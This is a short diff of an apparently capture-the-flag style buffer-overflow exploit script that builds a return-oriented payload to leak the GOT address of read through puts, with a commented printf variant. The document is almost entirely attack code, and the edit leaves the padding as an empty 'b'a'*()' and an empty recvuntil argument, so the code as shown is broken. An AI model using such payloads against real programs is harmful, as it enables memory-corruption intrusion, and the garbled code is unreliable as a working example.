@@ -28,7 +28,7 @@ pop_rdi =
 #************泄露got*********
 payload = b'a'*() + p64(pop_rdi) + p64(read_got)
 payload+= p64(puts_plt) + p64(main_addr) #puts-read
-#payload = b'a'*(0x20+8) + p64(pop_rdi) + p64(s_addr) + p64(pop_rsi) + p64(read_got)
+#payload = b'a'*() + p64(pop_rdi) + p64(s_addr) + p64(pop_rsi) + p64(read_got)
 #payload+= p64(0) + p64(printf_plt) + p64(main_addr) --printf-read
 p.sendline( payload)
 p.recvuntil('')
